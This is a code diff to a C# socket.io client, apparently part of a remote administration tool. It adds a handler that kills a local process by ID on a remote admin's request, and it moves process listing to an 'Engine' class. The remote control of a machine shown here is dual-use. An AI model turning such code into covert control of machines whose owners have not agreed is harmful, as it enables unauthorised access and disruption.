@@ -28,6 +28,7 @@ namespace Client
             });
 
             socket.On("processes", (data) => OnProcessesRequest(data));
+            socket.On("killprocess", (data) => OnKillProcessRequest(data));
 
             Console.ReadKey();
         }
@@ -40,7 +41,7 @@ namespace Client
 
             try
             {
-                list = SystemInfo.ListProcesses();
+                list = Engine.ListProcesses();
             }
             catch (Exception e)
             {
@@ -57,6 +58,21 @@ namespace Client
                     List = list,
                     CallbackAdminId = obj.CallbackAdminId
                 }));
+            }
+        }
+
+        private static void OnKillProcessRequest(object data)
+        {
+            var obj = JsonConvert.DeserializeAnonymousType(data.ToString(), new { Id = 0, CallbackAdminId = "" });
+
+            try
+            {
+                Engine.KillProcess(obj.Id);
+            }
+            catch (Exception e)
+            {
+                Log(obj.CallbackAdminId, e.Message, e.TargetSite == null ? null : e.TargetSite.Name);
+                return;
             }
         }
 
